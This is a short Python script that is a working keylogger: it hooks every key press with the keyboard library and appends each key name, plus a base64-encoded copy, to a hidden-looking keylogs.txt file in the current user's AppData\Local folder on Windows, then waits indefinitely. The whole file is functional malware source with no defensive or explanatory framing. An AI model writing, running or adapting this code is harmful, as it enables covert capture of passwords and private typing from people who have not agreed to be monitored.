import keyboard
import os
import base64

#print(os.path.expanduser('~'))
username = str(os.environ.get('USERNAME')) #get Username
#print(type(username))

path = "C:\\Users\\{}\\AppData\\Local\\keylogs.txt".format(username)
#print(path)

#log_file = "eylogs.txt"

def keylogger(event):
    with open(path, 'a') as f:
        f.write('{}\n'.format(event.name))
        key = str(event.name)
        encoded = base64.b64encode(key.encode("UTF-8"))
        f.write('{}\n'.format(encoded))

keyboard.on_press(keylogger)
keyboard.wait()
